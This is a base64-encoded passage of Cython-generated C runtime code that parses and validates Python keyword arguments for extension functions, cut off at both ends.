W1lIC0gYXJnbmFtZXMpO1xuICAgICAgICAgICAgcmV0dXJuIDE7XG4gICAgICAgIH1cbiAgICAgICAgI2Vsc2VcbiAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgIGlmIChQeVVuaWNvZGVfR0VUX0xFTkdUSChuYW1lX3N0cikgPT0gUHlVbmljb2RlX0dFVF9MRU5HVEgoa2V5KSlcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgICAgIGludCBjbXAgPSBQeVVuaWNvZGVfQ29tcGFyZShuYW1lX3N0ciwga2V5KTtcbiAgICAgICAgICAgIGlmIChjbXAgPCAwICYmIHVubGlrZWx5KFB5RXJyX09jY3VycmVkKCkpKSBnb3RvIGJhZDtcbiAgICAgICAgICAgIGlmIChjbXAgPT0gMCkge1xuICAgICAgICAgICAgICAgICppbmRleF9mb3VuZCA9IChzaXplX3QpIChuYW1lIC0gYXJnbmFtZXMpO1xuICAgICAgICAgICAgICAgIHJldHVybiAxO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgICNlbmRpZlxuICAgICAgICBuYW1lKys7XG4gICAgfVxuICAgIG5hbWUgPSBhcmduYW1lcztcbiAgICB3aGlsZSAobmFtZSAhPSBmaXJzdF9rd19hcmcpIHtcbiAgICAgICAgUHlPYmplY3QgKm5hbWVfc3RyID0gKipuYW1lO1xuICAgICAgICAjaWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAgICAgICBpZiAodW5saWtlbHkoa2V5X2hhc2ggPT0gKChQeUFTQ0lJT2JqZWN0KiluYW1lX3N0ciktPmhhc2gpKSB7XG4gICAgICAgICAgICBpZiAoX19QeXhfVW5pY29kZUtleXdvcmRzRXF1YWwobmFtZV9zdHIsIGtleSkpXG4gICAgICAgICAgICAgICAgZ290byBhcmdfcGFzc2VkX3R3aWNlO1xuICAgICAgICB9XG4gICAgICAgICNlbHNlXG4gICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICBpZiAoUHlVbmljb2RlX0dFVF9MRU5HVEgobmFtZV9zdHIpID09IFB5VW5pY29kZV9HRVRfTEVOR1RIKGtleSkpXG4gICAgICAgICNlbmRpZlxuICAgICAgICB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkobmFtZV9zdHIgPT0ga2V5KSkgZ290byBhcmdfcGFzc2VkX3R3aWNlO1xuICAgICAgICAgICAgaW50IGNtcCA9IFB5VW5pY29kZV9Db21wYXJlKG5hbWVfc3RyLCBrZXkpO1xuICAgICAgICAgICAgaWYgKGNtcCA8IDAgJiYgdW5saWtlbHkoUHlFcnJfT2NjdXJyZWQoKSkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgaWYgKGNtcCA9PSAwKSBnb3RvIGFyZ19wYXNzZWRfdHdpY2U7XG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgICAgIG5hbWUrKztcbiAgICB9XG4gICAgcmV0dXJuIDA7XG5hcmdfcGFzc2VkX3R3aWNlOlxuICAgIF9fUHl4X1JhaXNlRG91YmxlS2V5d29yZHNFcnJvcihmdW5jdGlvbl9uYW1lLCBrZXkpO1xuICAgIGdvdG8gYmFkO1xuYmFkOlxuICAgIHJldHVybiAtMTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfTWF0Y2hLZXl3b3JkQXJnX25vc3RyKFxuICAgIFB5T2JqZWN0ICprZXksXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLFxuICAgIHNpemVfdCAqaW5kZXhfZm91bmQsXG4gICAgY29uc3QgY2hhciAqZnVuY3Rpb25fbmFtZSlcbntcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqbmFtZTtcbiAgICBpZiAodW5saWtlbHkoIVB5VW5pY29kZV9DaGVjayhrZXkpKSkgZ290byBpbnZhbGlkX2tleXdvcmRfdHlwZTtcbiAgICBuYW1lID0gZmlyc3Rfa3dfYXJnO1xuICAgIHdoaWxlICgqbmFtZSkge1xuICAgICAgICBpbnQgY21wID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKCoqbmFtZSwga2V5LCBQeV9FUSk7XG4gICAgICAgIGlmIChjbXAgPT0gMSkge1xuICAgICAgICAgICAgKmluZGV4X2ZvdW5kID0gKHNpemVfdCkgKG5hbWUgLSBhcmduYW1lcyk7XG4gICAgICAgICAgICByZXR1cm4gMTtcbiAgICAgICAgfVxuICAgICAgICBpZiAodW5saWtlbHkoY21wID09IC0xKSkgZ290byBiYWQ7XG4gICAgICAgIG5hbWUrKztcbiAgICB9XG4gICAgbmFtZSA9IGFyZ25hbWVzO1xuICAgIHdoaWxlIChuYW1lICE9IGZpcnN0X2t3X2FyZykge1xuICAgICAgICBpbnQgY21wID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKCoqbmFtZSwga2V5LCBQeV9FUSk7XG4gICAgICAgIGlmICh1bmxpa2VseShjbXAgIT0gMCkpIHtcbiAgICAgICAgICAgIGlmIChjbXAgPT0gMSkgZ290byBhcmdfcGFzc2VkX3R3aWNlO1xuICAgICAgICAgICAgZWxzZSBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBuYW1lKys7XG4gICAgfVxuICAgIHJldHVybiAwO1xuYXJnX3Bhc3NlZF90d2ljZTpcbiAgICBfX1B5eF9SYWlzZURvdWJsZUtleXdvcmRzRXJyb3IoZnVuY3Rpb25fbmFtZSwga2V5KTtcbiAgICBnb3RvIGJhZDtcbmludmFsaWRfa2V5d29yZF90eXBlOlxuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICIlLjIwMHMoKSBrZXl3b3JkcyBtdXN0IGJlIHN0cmluZ3MiLCBmdW5jdGlvbl9uYW1lKTtcbiAgICBnb3RvIGJhZDtcbmJhZDpcbiAgICByZXR1cm4gLTE7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfTWF0Y2hLZXl3b3JkQXJnKFxuICAgIFB5T2JqZWN0ICprZXksXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqKiBjb25zdCAqZmlyc3Rfa3dfYXJnLFxuICAgIHNpemVfdCAqaW5kZXhfZm91bmQsXG4gICAgY29uc3QgY2hhciAqZnVuY3Rpb25fbmFtZSlcbntcbiAgICByZXR1cm4gbGlrZWx5KFB5VW5pY29kZV9DaGVja0V4YWN0KGtleSkpID9cbiAgICAgICAgX19QeXhfTWF0Y2hLZXl3b3JkQXJnX3N0cihrZXksIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKSA6XG4gICAgICAgIF9fUHl4X01hdGNoS2V5d29yZEFyZ19ub3N0cihrZXksIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsIGluZGV4X2ZvdW5kLCBmdW5jdGlvbl9uYW1lKTtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X1JlamVjdFVua25vd25LZXl3b3JkKFxuICAgIFB5T2JqZWN0ICprd2RzLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKiogY29uc3QgKmZpcnN0X2t3X2FyZyxcbiAgICBjb25zdCBjaGFyICpmdW5jdGlvbl9uYW1lKVxue1xuICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIFB5T2JqZWN0ICpwb3MgPSBOVUxMO1xuICAgICNlbHNlXG4gICAgUHlfc3NpemVfdCBwb3MgPSAwO1xuICAgICNlbmRpZlxuICAgIFB5T2JqZWN0ICprZXkgPSBOVUxMO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04oa3dkcyk7XG4gICAgd2hpbGUgKFxuICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgX19QeXhfUHlEaWN0X05leHRSZWYoa3dkcywgJnBvcywgJmtleSwgTlVMTClcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgUHlEaWN0X05leHQoa3dkcywgJnBvcywgJmtleSwgTlVMTClcbiAgICAgICAgI2VuZGlmXG4gICAgKSB7XG4gICAgICAgIFB5T2JqZWN0KiogY29uc3QgKm5hbWUgPSBmaXJzdF9rd19hcmc7XG4gICAgICAgIHdoaWxlICgqbmFtZSAmJiAoKipuYW1lICE9IGtleSkpIG5hbWUrKztcbiAgICAgICAgaWYgKCEqbmFtZSkge1xuICAgICAgICAgICAgc2l6ZV90IGluZGV4X2ZvdW5kID0gMDtcbiAgICAgICAgICAgIGludCBjbXAgPSBfX1B5eF9NYXRjaEtleXdvcmRBcmcoa2V5LCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCAmaW5kZXhfZm91bmQsIGZ1bmN0aW9uX25hbWUpO1xuICAgICAgICAgICAgaWYgKGNtcCAhPSAxKSB7XG4gICAgICAgICAgICAgICAgaWYgKGNtcCA9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiJXMoKSBnb3QgYW4gdW5leHBlY3RlZCBrZXl3b3JkIGFyZ3VtZW50IFwnJVVcJyIsXG4gICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbl9uYW1lLCBrZXkpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoa2V5KTtcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgUHlfREVDUkVGKGtleSk7XG4gICAgICAgICNlbmRpZlxuICAgIH1cbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIFB5X1hERUNSRUYocG9zKTtcbiAgICAjZW5kaWZcbiAgICBhc3NlcnQoUHlFcnJfT2NjdXJyZWQoKSk7XG59XG5zdGF0aWMgaW50IF9fUHl4X1BhcnNlS2V5d29yZERpY3QoXG4gICAgUHlPYmplY3QgKmt3ZHMsXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqdmFsdWVzW10sXG4gICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsXG4gICAgUHlfc3NpemVfdCBudW1fa3dhcmdzLFxuICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUsXG4gICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncylcbntcbiAgICBQeU9iamVjdCoqIGNvbnN0ICpuYW1lO1xuICAgIFB5T2JqZWN0KiogY29uc3QgKmZpcnN0X2t3X2FyZyA9IGFyZ25hbWVzICsgbnVtX3Bvc19hcmdzO1xuICAgIFB5X3NzaXplX3QgZXh0cmFjdGVkID0gMDtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IGRlZmluZWQoUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKVxuICAgIGlmICh1bmxpa2VseSghUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKGt3ZHMpKSkgcmV0dXJuIC0xO1xuI2VuZGlmXG4gICAgbmFtZSA9IGZpcnN0X2t3X2FyZztcbiAgICB3aGlsZSAoKm5hbWUgJiYgbnVtX2t3YXJncyA+IGV4dHJhY3RlZCkge1xuICAgICAgICBQeU9iamVjdCAqIGtleSA9ICoqbmFtZTtcbiAgICAgICAgUHlPYmplY3QgKnZhbHVlO1xuICAgICAgICBpbnQgZm91bmQgPSAwO1xuICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgICAgIGZvdW5kID0gUHlEaWN0X0dldEl0ZW1SZWYoa3dkcywga2V5LCAmdmFsdWUpO1xuICAgICAgICAjZWxzZVxuICAgICAgICB2YWx1ZSA9IFB5RGljdF9HZXRJdGVtV2l0aEVycm9yKGt3ZHMsIGtleSk7XG4gICAgICAgIGlmICh2YWx1ZSkge1xuICAgICAgICAgICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICAgICAgICAgIGZvdW5kID0gMTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkgZ290byBiYWQ7XG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgICAgIGlmIChmb3VuZCkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kIDwgMCkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gdmFsdWU7XG4gICAgICAgICAgICBleHRyYWN0ZWQrKztcbiAgICAgICAgfVxuICAgICAgICBuYW1lKys7XG4gICAgfVxuICAgIGlmIChudW1fa3dhcmdzID4gZXh0cmFjdGVkKSB7XG4gICAgICAgIGlmIChpZ25vcmVfdW5rbm93bl9rd2FyZ3MpIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9WYWxpZGF0ZUR1cGxpY2F0ZVBvc0FyZ3Moa3dkcywgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgZnVuY3Rpb25fbmFtZSkgPT0gLTEpKVxuICAgICAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgX19QeXhfUmVqZWN0VW5rbm93bktleXdvcmQoa3dkcywgYXJnbmFtZXMsIGZpcnN0X2t3X2FyZywgZnVuY3Rpb25fbmFtZSk7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgIH1cbiAgICByZXR1cm4gMDtcbmJhZDpcbiAgICByZXR1cm4gLTE7XG59XG5zdGF0aWMgaW50IF9fUHl4X1BhcnNlS2V5d29yZERpY3RUb0RpY3QoXG4gICAgUHlPYmplY3QgKmt3ZHMsXG4gICAgUHlPYmplY3QgKiogY29uc3QgYXJnbmFtZXNbXSxcbiAgICBQeU9iamVjdCAqa3dkczIsXG4gICAgUHlPYmplY3QgKnZhbHVlc1tdLFxuICAgIFB5X3NzaXplX3QgbnVtX3Bvc19hcmdzLFxuICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUpXG57XG4gICAgUHlPYmplY3QqKiBjb25zdCAqbmFtZTtcbiAgICBQeU9iamVjdCoqIGNvbnN0ICpmaXJzdF9rd19hcmcgPSBhcmduYW1lcyArIG51bV9wb3NfYXJncztcbiAgICBQeV9zc2l6ZV90IGxlbjtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IGRlZmluZWQoUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKVxuICAgIGlmICh1bmxpa2VseSghUHlBcmdfVmFsaWRhdGVLZXl3b3JkQXJndW1lbnRzKGt3ZHMpKSkgcmV0dXJuIC0xO1xuI2VuZGlmXG4gICAgaWYgKFB5RGljdF9VcGRhdGUoa3dkczIsIGt3ZHMpIDwgMCkgZ290byBiYWQ7XG4gICAgbmFtZSA9IGZpcnN0X2t3X2FyZztcbiAgICB3aGlsZSAoKm5hbWUpIHtcbiAgICAgICAgUHlPYmplY3QgKmtleSA9ICoqbmFtZTtcbiAgICAgICAgUHlPYmplY3QgKnZhbHVlO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEEyIHx8IGRlZmluZWQoUHlEaWN0X1BvcCkpXG4gICAgICAgIGludCBmb3VuZCA9IFB5RGljdF9Qb3Aoa3dkczIsIGtleSwgJnZhbHVlKTtcbiAgICAgICAgaWYgKGZvdW5kKSB7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoZm91bmQgPCAwKSkgZ290byBiYWQ7XG4gICAgICAgICAgICB2YWx1ZXNbbmFtZS1hcmduYW1lc10gPSB2YWx1ZTtcbiAgICAgICAgfVxuI2VsaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMDAwXG4gICAgICAgIGludCBmb3VuZCA9IFB5RGljdF9HZXRJdGVtUmVmKGt3ZHMyLCBrZXksICZ2YWx1ZSk7XG4gICAgICAgIGlmIChmb3VuZCkge1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KGZvdW5kIDwgMCkpIGdvdG8gYmFkO1xuICAgICAgICAgICAgdmFsdWVzW25hbWUtYXJnbmFtZXNdID0gdmFsdWU7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoUHlEaWN0X0RlbEl0ZW0oa3dkczIsIGtleSkgPCAwKSkgZ290byBiYWQ7XG4gICAgICAgIH1cbiNlbHNlXG4gICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTlxuICAgICAgICB2YWx1ZSA9IF9QeURpY3RfUG9wKGt3ZHMyLCBrZXksIGt3ZHMyKTtcbiAgICAjZWxzZVxuICAgICAgICB2YWx1ZSA9IF9fUHl4X0NhbGxVbmJvdW5kQ01ldGhvZDIoJl9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3VtZXRob2RfUHlEaWN0X1R5cGVfcG9wLCBrd2RzMiwga2V5LCBrd2RzMik7XG4gICAgI2VuZGlmXG4gICAgICAgIGlmICh2YWx1ZSA9PSBrd2RzMikge1xuICAgICAgICAgICAgUHlfREVDUkVGKHZhbHVlKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghdmFsdWUpKSBnb3RvIGJhZDtcbiAgICAgICAgICAgIHZhbHVlc1tuYW1lLWFyZ25hbWVzXSA9IHZhbHVlO1xuICAgICAgICB9XG4jZW5kaWZcbiAgICAgICAgbmFtZSsrO1xuICAgIH1cbiAgICBsZW4gPSBQeURpY3RfU2l6ZShrd2RzMik7XG4gICAgaWYgKGxlbiA+IDApIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X1ZhbGlkYXRlRHVwbGljYXRlUG9zQXJncyhrd2RzLCBhcmduYW1lcywgZmlyc3Rfa3dfYXJnLCBmdW5jdGlvbl9uYW1lKTtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGxlbiA9PSAtMSkpIHtcbiAgICAgICAgZ290byBiYWQ7XG4gICAgfVxuICAgIHJldHVybiAwO1xuYmFkOlxuICAgIHJldHVybiAtMTtcbn1cbnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3Jkc1R1cGxlKFxuICAgIFB5T2JqZWN0ICprd2RzLFxuICAgIFB5T2JqZWN0ICogY29uc3QgKmt3dmFsdWVzLFxuICAgIFB5T2JqZWN0ICoqIGNvbnN0IGFyZ25hbWVzW10sXG4gICAgUHlPYmplY3QgKmt3ZHMyLFxuICAgIFB5T2JqZWN0ICp2YWx1ZXNbXSxcbiAgICBQeV9zc2l6ZV90IG51bV9wb3NfYXJncyxcbiAgICBQeV9zc2l6ZV90IG51bV9rd2FyZ3MsXG4gICAgY29uc3QgY2hhciogZnVuY3Rpb25fbmFtZSxcbiAgICBpbnQgaWdub3JlX3Vua25vd25fa3dhcmdzKVxue1xuICAgIFB5T2JqZWN0ICprZXkgPSBOVUxMO1xuICAgIFB5T2JqZWN0KiogY29uc3QgKiBuYW1lO1xuICAgIFB5T2JqZWN0KiogY29uc3QgKmZpcnN0X2t3X2FyZyA9IGFyZ25hbWVzICsgbnVtX3Bvc19hcmdzO1xuICAgIGZvciAoUHlfc3NpemVfdCBwb3MgPSAwOyBwb3MgPCBudW1fa3dhcmdzOyBwb3MrKykge1xuI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgIGtleSA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShrd2RzLCBwb3MpO1xuI2Vsc2VcbiAgICAgICAga2V5ID0gX19QeXhfUHlUdXBsZV9HRVRfSVRFTShrd2RzLCBwb3MpO1xuI2VuZGlmXG4jaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAgICAgaWYgKHVubGlrZWx5KCFrZXkpKSBnb3RvIGJhZDtcbiNlbmRpZlxuICAgICAgICBuYW1lID0gZmlyc3Rfa3dfYXJnO1xuICAgICAgICB3aGlsZSAoKm5hbWUgJiYgKCoqbmFtZSAhPSBrZXkpKSBuYW1lKys7XG4gICAgICAgIGlmICgqbmFtZSkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnZhbHVlID0ga3d2YWx1ZXNbcG9zXTtcbiAgICAgICAgICAgIHZhbHVlc1tuYW1lLWFyZ25hbWVzXSA9IF9fUHl4X05ld1JlZih2YWx1ZSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBzaXplX3QgaW5kZXhfZm91bmQgPSAwO1xuICAgICAgICAgICAgaW50IGNtcCA9IF9fUHl4X01hdGNoS2V5d29yZEFyZyhrZXksIGFyZ25hbWVzLCBmaXJzdF9rd19hcmcsICZpbmRleF9mb3VuZCwgZnVuY3Rpb25fbmFtZSk7XG4gICAgICAgICAgICBpZiAoY21wID09IDEpIHtcbiAgICAgICAgICAgICAgICBQeU9iamVjdCAqdmFsdWUgPSBrd3ZhbHVlc1twb3NdO1xuICAgICAgICAgICAgICAgIHZhbHVlc1tpbmRleF9mb3VuZF0gPSBfX1B5eF9OZXdSZWYodmFsdWUpO1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoY21wID09IC0xKSkgZ290byBiYWQ7XG4gICAgICAgICAgICAgICAgaWYgKGt3ZHMyKSB7XG4gICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICp2YWx1ZSA9IGt3dmFsdWVzW3Bvc107XG4gICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShQeURpY3RfU2V0SXRlbShrd2RzMiwga2V5LCB2YWx1ZSkpKSBnb3RvIGJhZDtcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCFpZ25vcmVfdW5rbm93bl9rd2FyZ3MpIHtcbiAgICAgICAgICAgICAgICAgICAgZ290byBpbnZhbGlkX2tleXdvcmQ7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICBQeV9ERUNSRUYoa2V5KTtcbiAgICAgICAga2V5ID0gTlVMTDtcbiAgICAgICAgI2VuZGlmXG4gICAgfVxuICAgIHJldHVybiAwO1xuaW52YWxpZF9rZXl3b3JkOlxuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICIlcygpIGdvdCBhbiB1bmV4cGVjdGVkIGtleXdvcmQgYXJndW1lbnQgXCclVVwnIixcbiAgICAgICAgZnVuY3Rpb25fbmFtZSwga2V5KTtcbiAgICBnb3RvIGJhZDtcbmJhZDpcbiAgICAjaWYgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBQeV9YREVDUkVGKGtleSk7XG4gICAgI2VuZGlmXG4gICAgcmV0dXJuIC0xO1xufVxuXG5cbnN0YXRpYyBpbnQgX19QeXhfUGFyc2VLZXl3b3JkcyhcbiAgICBQeU9iamVjdCAqa3dkcyxcbiAgICBQeU9iamVjdCAqIGNvbnN0ICprd3ZhbHVlcyxcbiAgICBQeU9iamVjdCAqKiBjb25zdCBhcmduYW1lc1tdLFxuICAgIFB5T2JqZWN0ICprd2RzMixcbiAgICBQeU9iamVjdCAqdmFsdWVzW10sXG4gICAgUHlfc3NpemVfdCBudW1fcG9zX2FyZ3MsXG4gICAgUHlfc3NpemVfdCBudW1fa3dhcmdzLFxuICAgIGNvbnN0IGNoYXIqIGZ1bmN0aW9uX25hbWUsXG4gICAgaW50IGlnbm9yZV91bmtub3duX2t3YXJncylcbntcbiAgICBpZiAoQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgbGlrZWx5KFB5VHVwbGVfQ2hlY2soa3dkcykpKVxuICAgICAgICByZXR1cm4gX19QeXhfUGFyc2VLZXl3b3Jkc1R1cGxlKGt3ZHMsIGt3dmFsdWVzLCBhcmduYW1lcywga3dkczIsIHZhbHVlcywgbnVtX3Bvc19hcmdzLCBudW1fa3dhcmdzLCBmdW5jdGlvbl9uYW1lLCBpZ25vcmVfdW5rbm93bl9rd2FyZ3MpO1xuICAgIGVsc2UgaWYgKGt3ZHMyKVxuICAgICAgICByZXR1cm4gX19QeXhfUGFyc2VLZXl3b3JkRGljdFRvRGljdChrd2RzLCBhcmduYW1lcywga3dkczIsIHZhbHVlcywgbnVtX3Bvc19hcmdzLCBmdW5jdGlvbl9uYW1lKTtcbiAgICBlbHNlXG4gICAgICAgIHJldHVybiBfX1B5eF9QYXJzZUtleXdvcmREaWN0KGt3ZHMsIGFyZ25hbWVzLCB2YWx1ZXMsIG51bV9wb3NfYXJncywgbnVtX2t3YXJncywgZnVuY3Rpb25fbmFtZSwgaWdub3JlX3Vua25vd25fa3dhcmdzKTtcbn1cblxuXG5zdGF0aWMgdm9pZCBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZChcbiAgICBjb25zdCBjaGFyKiBmdW5jX25hbWUsXG4gICAgaW50IGV4YWN0LFxuICAgIFB5X3NzaXplX3QgbnVtX21pbixcbiAgICBQeV9zc2l6ZV90IG51bV9tYXgsXG4gICAgUHlfc3NpemVfdCBudW1fZm91bmQpXG57XG4gICAgUHlfc3NpemVfdCBudW1fZXhwZWN0ZWQ7XG4gICAgY29uc3QgY2hhciAqbW9yZV9vcl9sZXNzO1xuICAgIGlmIChudW1fZm91bmQgPCBudW1fbWluKSB7XG4gICAgICAgIG51bV9leHBlY3RlZCA9IG51bV9taW47XG4gICAgICAgIG1vcmVfb3JfbGVzcyA9ICJhdCBsZWFzdCI7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgbnVtX2V4cGVjdGVkID0gbnVtX21heDtcbiAgICAgICAgbW9yZV9vcl9sZXNzID0gImF0IG1vc3QiO1xuICAgIH1cbiAgICBpZiAoZXhhY3QpIHtcbiAgICAgICAgbW9yZV9vcl9sZXNzID0gImV4YWN0bHkiO1xuICAgIH1cbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAiJS4yMDBzKCkgdGFrZXMgJS44cyAlIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgcG9zaXRpb25hbCBhcmd1bWVudCUuMXMgKCUiIENZVEhPTl9GT1JNQVRfU1NJWkVfVCAiZCBnaXZlbikiLFxuICAgICAgICAgICAgICAgICBmdW5jX25hbWUsIG1vcmVfb3JfbGVzcywgbnVtX2V4cGVjdGVkLFxuICAgICAgICAgICAgICAgICAobnVtX2V4cGVjdGVkID09IDEpID8gIiIgOiAicyIsIG51bV9mb3VuZCk7XG59XG5cblxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSwgUHlPYmplY3QqIHZhbHVlKSB7XG4gICAgUHlUeXBlT2JqZWN0KiB0cCA9IFB5X1RZUEUob2JqKTtcbiAgICBpZiAobGlrZWx5KHRwLT50cF9zZXRhdHRybykpXG4gICAgICAgIHJldHVybiB0cC0+dHBfc2V0YXR0cm8ob2JqLCBhdHRyX25hbWUsIHZhbHVlKTtcbiAgICByZXR1cm4gUHlPYmplY3RfU2V0QXR0cihvYmosIGF0dHJfbmFtZSwgdmFsdWUpO1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OUyAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFBZX1VJTlQ2NF9UIF9fUHl4X2dldF90cF9kaWN0X3ZlcnNpb24oUHlPYmplY3QgKm9iaikge1xuICAgIFB5T2JqZWN0ICpkaWN0ID0gUHlfVFlQRShvYmopLT50cF9kaWN0O1xuICAgIHJldHVybiBsaWtlbHkoZGljdCkgPyBfX1BZWF9HRVRfRElDVF9WRVJTSU9OKGRpY3QpIDogMDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFBZX1VJTlQ2NF9UIF9fUHl4X2dldF9vYmplY3RfZGljdF92ZXJzaW9uKFB5T2JqZWN0ICpvYmopIHtcbiAgICBQeU9iamVjdCAqKmRpY3RwdHIgPSBOVUxMO1xuICAgIFB5X3NzaXplX3Qgb2Zmc2V0ID0gUHlfVFlQRShvYmopLT50cF9kaWN0b2Zmc2V0O1xuICAgIGlmIChvZmZzZXQpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAg